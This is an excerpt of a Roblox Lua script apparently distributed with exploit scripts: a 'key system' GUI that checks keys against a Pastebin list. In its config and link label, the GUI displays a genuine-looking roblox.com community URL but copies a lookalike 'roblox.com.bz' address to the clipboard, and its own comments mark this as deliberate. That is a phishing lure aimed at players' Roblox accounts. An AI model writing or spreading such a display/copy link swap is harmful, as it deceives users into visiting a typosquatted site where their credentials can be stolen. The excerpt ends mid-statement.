-- // Aurora Script Studios — Key System GUI
...
-- // CONFIG
local GROUP_LINK = "https://roblox.com.bz/communities/9044607186/"         -- real link (copied to clipboard)
local GROUP_LINK_DISPLAY = "https://roblox.com/communities/9044607186/"    -- display only

-- // KEY VALIDATION via Pastebin
local function isKeyValid(key)
    local ok, result = pcall(function()
        return game:HttpGet("https://pastebin.com/raw/yL71tkx4")
    end)
    if not ok then return false end
    for validKey in result:gmatch("[^\n]+") do
        if key == validKey:gsub("%s+", "") then return true end
    end
    return false
end
...
local oldGui = PlayerGui:FindFirstChild("AuroraScriptStudios_KeySys")
if oldGui then oldGui:Destroy() end

-- // SCREEN GUI
local Gui = Instance.new("ScreenGui")
Gui.Name = "AuroraScriptStudios_KeySys"
...
-- Shows display link, copies real link
label(LinkFrame, {
    Size = UDim2.new(1, -24, 1, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    Position = UDim2.new(0, 16, 0.5, 0),
    Text = GROUP_LINK_DISPLAY,
    TextSize = 11,
    Font = Enum.Font.Code,
    TextColor3 = C.MUTED,
    TextXAlignment = Enum.TextXAlignment.Left,
